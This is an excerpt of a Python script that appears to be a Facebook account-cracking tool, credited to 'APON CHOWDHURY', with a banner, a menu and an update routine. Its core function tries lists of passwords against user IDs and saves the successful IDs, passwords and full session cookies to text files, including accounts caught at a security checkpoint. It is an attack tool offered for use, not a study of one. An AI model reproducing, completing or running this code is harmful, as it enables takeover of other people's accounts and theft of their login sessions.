...
└━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┘
    ...
    ┌━━━━━━━━━━━━━━━━━ 𝑨𝑲𝑨𝑺𝑯 ━━━━━━━━━━━━━━━━━━┑
               \033[1;97mCREATED BY   :  APON CHOWDHURY          
               \033[1;91mFACEBOK      :  BERFIN LUCK 😎            
               \033[1;97mGITHUB       :  HACKER-X_APON       
               \033[1;91mSTATUS       :   𝑭𝑹𝑬𝑬😄            
               \033[1;97mTEAM         :  APON CHOWDHURY                 
               \033[1;91mTOOL VIRSION : X_0.1                    
...
def menu():
	...
	if ot == '1':
		os.system('xdg-open https://www.youtube.com/@berfinluck')
		crack_file()
...
def c(uid,pwx,ln):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write(f'\r%s[APON-𝙷𝙰𝙲𝙺𝙴𝚁] [%s/%s] [OK-%s] [CP-%s] \r'%(wa,loop,ln,len(oks),len(cps))),
            sys.stdout.flush()
         ...
         #   log_cookies=session.cookies.get_dict().keys()
            ...
            #	botok(uid,ps)
            	...
            	cid = coki[65:80]
            	print('\033[1;92mAPON-OK[😎]\033[1;92m] \033[1;92m' +cid+ ' | ' +ps+    ' |>>'+tahunng(cid))
            	print('\033[1;92m[\033[1;92m🍪\033[1;92m]COOKIES : \033[1;92m'+coki+ '')
            	open('APON-OK.txt', 'a').write( cid+' | '+ps+'\n')
            	open('APON-coki.txt', 'a').write(coki+'\n')
            	...
            	coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
            	cid = coki[82:97]
            	print('\33[1;30m(APON-Cp [💔] '+cid+ ' | ' +ps+'  |>>'+tahunng(cid))
            	#print('\033[1;92m[\033[1;92mðŸª\033[1;92m]COOKIES : \033[1;92m'+coki+ '')
            	open('APON-CP.txt', 'a').write( uid+' | '+ps+' \n')
            	cps.append(cid)
            	break
            else:
            	#print (random_header())
...
def toolscontrol():
	...
	if v in peo:
		...
		clear()
		jalan (" UPDATED BY APON CHOWDHURY ")
		time.sleep(1)
		os.system('xdg-open https://p.facebook.com/100041684800644')
		exit()
	else:
		exit()
...
def update():
  ...
  clear()
  print (' \033[0;93mUPDATED BY APON CHOWDHURY ')
  time.sleep(2)
  print ("\033[1;32m")
  os.system("git pull")
  os.system("git pull")
